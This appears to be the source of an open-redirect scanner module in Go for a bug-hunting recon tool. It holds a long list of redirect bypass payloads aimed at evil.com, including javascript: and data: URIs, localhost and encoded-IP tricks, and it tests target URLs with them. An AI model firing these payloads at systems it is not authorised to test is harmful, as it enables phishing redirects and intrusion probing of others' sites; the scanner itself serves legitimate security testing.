package redirect

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"github.com/a0x194/recon-hunter/internal/config"
	"github.com/a0x194/recon-hunter/internal/types"
	"github.com/a0x194/recon-hunter/internal/utils"
)

// Redirect payloads for testing
var redirectPayloads = []struct {
	payload     string
	description string
}{
	// Basic redirects
	{"https://evil.com", "Direct external URL"},
	{"//evil.com", "Protocol-relative URL"},
	{"/\\evil.com", "Backslash bypass"},
	{"\\/evil.com", "Escaped slash bypass"},

	// URL encoding bypasses
	{"https:%2f%2fevil.com", "URL encoded slashes"},
	{"https:%252f%252fevil.com", "Double URL encoded slashes"},
	{"%2f%2fevil.com", "Encoded protocol-relative"},
	{"%252f%252fevil.com", "Double encoded protocol-relative"},

	// Whitespace and special chars
	{"https://evil.com%20", "Trailing space"},
	{"https://evil.com%09", "Trailing tab"},
	{"https://evil.com%0d%0a", "CRLF injection"},
	{" https://evil.com", "Leading space"},
	{"\thttps://evil.com", "Leading tab"},

	// Unicode/Punycode bypasses
	{"https://evil。com", "Unicode full-stop"},
	{"https://evil%E3%80%82com", "Encoded unicode dot"},

	// @ symbol bypasses
	{"https://trusted.com@evil.com", "Credential bypass"},
	{"https://trusted.com%40evil.com", "Encoded @ bypass"},
	{"//trusted.com@evil.com", "Protocol-relative credential"},

	// Fragment and query bypasses
	{"https://evil.com#trusted.com", "Fragment bypass"},
	{"https://evil.com?trusted.com", "Query bypass"},
	{"//evil.com#@trusted.com", "Fragment with @"},
	{"//evil.com?@trusted.com", "Query with @"},

	// Null byte injection
	{"https://evil.com%00.trusted.com", "Null byte injection"},
	{"https://evil.com%00trusted.com", "Null byte without dot"},

	// Case variations
	{"HTTPS://evil.com", "Uppercase scheme"},
	{"hTtPs://evil.com", "Mixed case scheme"},

	// Localhost/internal redirects
	{"http://127.0.0.1", "Localhost redirect"},
	{"http://localhost", "Localhost keyword"},
	{"http://[::1]", "IPv6 localhost"},

	// Data URI
	{"data:text/html,<script>alert(1)</script>", "Data URI"},
	{"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "Base64 data URI"},

	// JavaScript URI
	{"javascript:alert(document.domain)", "JavaScript URI"},
	{"javascript://evil.com/%0aalert(1)", "JavaScript with comment"},

	// Backslash variations
	{"https:\\\\evil.com", "Double backslash"},
	{"https:/\\evil.com", "Mixed slash"},
	{"https:\\/evil.com", "Escaped mixed slash"},

	// Multiple slashes
	{"https:///evil.com", "Triple slash"},
	{"////evil.com", "Multiple protocol-relative"},

	// Dot variations
	{"https://evil.com.", "Trailing dot"},
	{"https://.evil.com", "Leading dot in domain"},
	{"https://evil..com", "Double dot"},

	// Port variations
	{"https://evil.com:443", "With standard port"},
	{"https://evil.com:80", "With HTTP port"},
	{"https://evil.com:8080", "With alternate port"},

	// Subdomain of trusted domain bypass attempts
	{"https://evil.com.trusted.com", "Subdomain spoof"},
	{"https://trusted.com.evil.com", "Reverse subdomain spoof"},
	{"https://trustedcom.evil.com", "Domain concatenation"},

	// IPv6 variations
	{"http://[0:0:0:0:0:ffff:127.0.0.1]", "IPv6 mapped IPv4"},
	{"http://[::ffff:127.0.0.1]", "IPv6 mapped localhost"},

	// Decimal/Octal/Hex IP
	{"http://2130706433", "Decimal IP localhost"},
	{"http://0x7f000001", "Hex IP localhost"},
	{"http://017700000001", "Octal IP localhost"},
}

// Common redirect parameter names
var redirectParams = []string{
	"url", "redirect", "redirect_url", "redirect_uri", "redir", "return",
	"return_url", "return_to", "returnTo", "returnUrl", "next", "next_url",
	"goto", "go", "target", "dest", "destination", "to", "out", "view",
	"link", "linkurl", "forward", "forward_url", "continue", "continueTo",
	"callback", "callback_url", "path", "data", "reference", "site", "html",
	"val", "validate", "domain", "location", "loc", "u", "r", "n",
	"checkout_url", "success_url", "failure_url", "error_url", "login_url",
	"logout_url", "image_url", "file", "page", "feed", "host", "port",
	"oauth_callback", "saml_callback", "oidc_callback",
}

// Scan performs open redirect scanning
func Scan(urls []string, cfg *config.Config) ([]types.VulnResult, error) {
	var results []types.VulnResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	// Use a client that doesn't follow redirects
	client := utils.HTTPClientNoRedirect(cfg.Timeout, cfg.Proxy)
	sem := make(chan struct{}, cfg.Threads)

	for _, urlStr := range urls {
		if !utils.HasParam(urlStr) {
			continue
		}

		parsedURL, err := url.Parse(urlStr)
		if err != nil {
			continue
		}

		params := parsedURL.Query()
		hasRedirectParam := false
		for param := range params {
			paramLower := strings.ToLower(param)
			for _, redirectParam := range redirectParams {
				if strings.Contains(paramLower, redirectParam) || paramLower == redirectParam {
					hasRedirectParam = true
					break
				}
			}
		}

		if !hasRedirectParam {
			continue
		}

		wg.Add(1)
		sem <- struct{}{}

		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			vulns := testRedirect(u, client)
			if len(vulns) > 0 {
				mu.Lock()
				results = append(results, vulns...)
				mu.Unlock()
			}
		}(urlStr)
	}

	wg.Wait()
	return results, nil
}

func testRedirect(urlStr string, client *http.Client) []types.VulnResult {
	var results []types.VulnResult

	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return nil
	}

	params := parsedURL.Query()
	originalHost := parsedURL.Host

	for param := range params {
		for _, test := range redirectPayloads {
			result := testPayload(urlStr, param, test.payload, test.description, originalHost, client)
			if result != nil {
				results = append(results, *result)
				break // Found redirect for this param
			}
		}
	}

	return results
}

func testPayload(urlStr, param, payload, description, originalHost string, client *http.Client) *types.VulnResult {
	parsedURL, _ := url.Parse(urlStr)
	originalParams := parsedURL.Query()

	testParams := url.Values{}
	for k, v := range originalParams {
		testParams[k] = v
	}
	testParams.Set(param, payload)

	parsedURL.RawQuery = testParams.Encode()
	testURL := parsedURL.String()

	resp, err := client.Get(testURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	// Check for redirect status codes
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		location := resp.Header.Get("Location")
		if location != "" {
			// Parse the location to check if it redirects to external domain
			if isExternalRedirect(location, originalHost) {
				severity := "high"
				if strings.HasPrefix(payload, "javascript:") || strings.HasPrefix(payload, "data:") {
					severity = "critical"
				}

				return &types.VulnResult{
					Type:        "Open Redirect",
					Severity:    severity,
					URL:         urlStr,
					Parameter:   param,
					Payload:     payload,
					Evidence:    fmt.Sprintf("Redirects to: %s (Status: %d)", location, resp.StatusCode),
					Description: fmt.Sprintf("Open redirect vulnerability found. Bypass technique: %s", description),
					Remediation: "Validate redirect URLs against a whitelist. Use relative paths only. Never redirect to user-controlled URLs without validation.",
					References: []string{
						"https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
						"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect",
					},
				}
			}
		}
	}

	// Check for meta refresh redirect in response body
	// This is handled separately as it's a different redirect mechanism

	return nil
}

func isExternalRedirect(location, originalHost string) bool {
	// Handle protocol-relative URLs
	if strings.HasPrefix(location, "//") {
		location = "https:" + location
	}

	// Handle javascript: and data: URIs
	if strings.HasPrefix(strings.ToLower(location), "javascript:") ||
		strings.HasPrefix(strings.ToLower(location), "data:") {
		return true
	}

	// Parse the redirect location
	parsedLocation, err := url.Parse(location)
	if err != nil {
		return false
	}

	// If no host, it's a relative redirect (safe)
	if parsedLocation.Host == "" {
		return false
	}

	// Check if redirecting to a different host
	locationHost := strings.ToLower(parsedLocation.Host)
	originalHostLower := strings.ToLower(originalHost)

	// Remove port for comparison
	if idx := strings.Index(locationHost, ":"); idx != -1 {
		locationHost = locationHost[:idx]
	}
	if idx := strings.Index(originalHostLower, ":"); idx != -1 {
		originalHostLower = originalHostLower[:idx]
	}

	// Check if it's the same domain or a subdomain
	if locationHost == originalHostLower {
		return false
	}
	if strings.HasSuffix(locationHost, "."+originalHostLower) {
		return false
	}

	// Check for known safe patterns
	if locationHost == "evil.com" || strings.HasSuffix(locationHost, ".evil.com") {
		return true // Our test domain
	}

	// Check for localhost redirects (could be SSRF-related)
	if locationHost == "localhost" || locationHost == "127.0.0.1" ||
		strings.HasPrefix(locationHost, "192.168.") ||
		strings.HasPrefix(locationHost, "10.") ||
		strings.HasPrefix(locationHost, "172.") {
		return true
	}

	return locationHost != originalHostLower
}
